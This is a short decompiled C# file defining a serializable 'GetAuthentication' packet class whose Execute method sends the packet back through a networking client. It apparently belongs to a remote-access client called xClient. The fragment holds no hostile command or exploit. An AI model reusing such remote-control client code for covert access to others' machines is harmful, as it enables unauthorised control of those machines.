using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x020000DE RID: 222
	[Serializable]
	public class GetAuthentication : IPacket
	{
		// Token: 0x0600059A RID: 1434 RVA: 0x00004AEA File Offset: 0x00002CEA
		public void Execute(Client client)
		{
			client.Send<GetAuthentication>(this);
		}
	}
}
